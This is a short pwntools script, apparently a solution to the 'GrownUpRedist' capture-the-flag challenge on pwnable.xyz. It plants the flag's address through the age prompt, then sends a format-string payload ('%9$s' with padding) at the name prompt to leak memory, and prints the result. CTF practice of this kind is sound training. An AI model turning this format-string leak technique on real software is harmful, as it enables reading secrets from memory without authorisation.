from pwn import *

s = remote("svc.pwnable.xyz",30004)
#s = process("./GrownUpRedist")
#gdb.attach(proc.pidof(s)[0])

flag = 0x601080

pay = "A"*32 + "%9$s" + "A"*95

s.recvuntil("Are you 18 years or older? [y/N]: ")
s.send("Y"*8+p64(flag))

s.recvuntil("Name: ")
s.sendline(pay)

print s.recv(1024).replace("A","")
